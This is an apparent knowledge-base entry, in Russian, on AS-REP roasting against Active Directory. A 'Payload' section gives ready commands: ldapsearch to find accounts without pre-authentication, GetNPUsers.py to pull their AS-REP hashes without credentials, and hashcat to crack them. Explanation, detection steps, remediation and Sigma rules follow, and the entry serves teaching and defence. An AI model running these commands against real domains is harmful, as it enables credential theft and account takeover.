---
id: ad-as-rep-roasting
title: "AS-REP roasting: учётки без предварительной аутентификации"
type: ad
target: active-directory
category: active-directory
difficulty: intermediate
bypass: auth
tags: [kerberos, as-rep, preauth, password-cracking, active-directory]
tested_on: ["Windows Server 2019 DC", "учётка с DONT_REQ_PREAUTH"]
success_rate: 0.5
risk: high
cwe: "CWE-521"
lab: null
last_verified: "2026-10-23"
references:
  - "https://adsecurity.org/"
  - "https://attack.mitre.org/techniques/T1558/004/"
graph:
  - target: "kerberos"
    type: instance_of
  - target: "credential-access"
    type: leads_to
  - target: "bruteforce"
    type: related_to
  - target: "enumeration"
    type: related_to
---

# AS-REP roasting: учётки без предварительной аутентификации

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# найти учётки с отключённой пред-аутентификацией
ldapsearch -x -H ldap://dc01.lab.local -b 'DC=lab,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName

# без учётных данных домена: запросить AS-REP для найденных имён
GetNPUsers.py lab.local/ -usersfile usernames.txt -no-pass -dc-ip 10.10.10.5 \
  -format hashcat > asrep.hash
hashcat -m 18200 asrep.hash wordlists/passwords/top-500.txt
```

## Explanation

Обычно клиент доказывает знание пароля ещё до получения билета (pre-authentication,
PA-ENC-TIMESTAMP). Если у учётки установлен флаг
`DONT_REQ_PREAUTH` (4194304) в `userAccountControl`, KDC отдаёт AS-REP
**без проверки** — а часть ответа зашифрована ключом, производным от пароля
пользователя. Этот фрагмент можно подбирать офлайн (hashcat mode 18200).

Ключевое отличие от kerberoasting: учётные данные домена не нужны вовсе —
достаточно знать имена пользователей (их дают anonymous LDAP, SMTP-перебор,
утечки, `enum4linux`).

Флаг включают по двум причинам: legacy-приложения, не поддерживающие pre-auth,
и «быстрое решение» проблем со входом сервисов. В обоих случаях это
конфигурационный долг, который превращается в дыру.

## Detection

1. **Инвентаризация**: `Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'`.
   Список должен быть пустым или обоснованным исключениями.
2. **Event 4768** с `Pre-Auth Type = 0x0` (отсутствует) — прямой признак
   roasting-запроса.
3. Массовые AS-запросы к разным именам от одного источника, особенно
   с ошибками `KDC_ERR_C_PRINCIPAL_UNKNOWN` (перебор имён).
4. **Event 4771** (pre-auth failed) волной — признак enumerate+roast.
5. Сетевой признак: всплеск LDAP-запросов с фильтром по
   `userAccountControl:1.2.840.113556.1.4.803:=4194304`.

## Remediation

- Снять флаг `DoesNotRequirePreAuth` у всех учёток; для legacy-приложений —
  обновить клиентскую библиотеку или вынести учётку в изолированное OU
  со сложным паролем и мониторингом.
- GPO/скрипт-аудит: еженедельная проверка флага и алерт на его появление
  (Event 5136 + атрибут `userAccountControl`).
- Пароли: ≥ 25 символов для любых учёток, которые технически нельзя перевести
  на gMSA; запрет «человеческих» паролей.
- Ограничить анонимное/обычное перечисление пользователей (LDAP-политики,
  `RestrictAnonymous`), чтобы усложнить подбор имён.
- Мониторинг 4768 с `PreAuthType=0` и 4771-волн; алерт на перебор имён.
- Защита от перебора имён: rate limiting на LDAP/Kerberos на уровне сетевого
  сегмента (DC не умеет сам ограничивать частоту).


## Detection rules

```yaml
title: AS-REP roasting — запрос билета без пред-аутентификации
id: a1b2c3d4-0002-4a1b-9c1d-000000000002
status: experimental
description: >-
  Event 4768 с PreAuthType=0 означает, что KDC выдал AS-REP без проверки знания
  пароля — признак учётки с DONT_REQ_PREAUTH и возможного roasting.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0x0'
  filter_known_service:
    AccountName|endswith: '$'      # машинные учётки в отдельных сценариях легитимны
  condition: selection and not filter_known_service
falsepositives:
  - legacy-приложения с обоснованным отключением pre-auth
level: high
tags: [attack.credential_access, attack.t1558.004]
---
title: Массовые неудачные pre-auth (перебор имён/паролей)
id: a1b2c3d4-0003-4a1b-9c1d-000000000003
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4771
    Status: '0xc000006a'            # KDC_ERR_PREAUTH_FAILED
  timeframe: 10m
  condition: selection | count() by AccountName > 10
falsepositives:
  - зависшие службы с неверным паролем, опечатки пользователей
level: medium
tags: [attack.credential_access, attack.t1110]
```
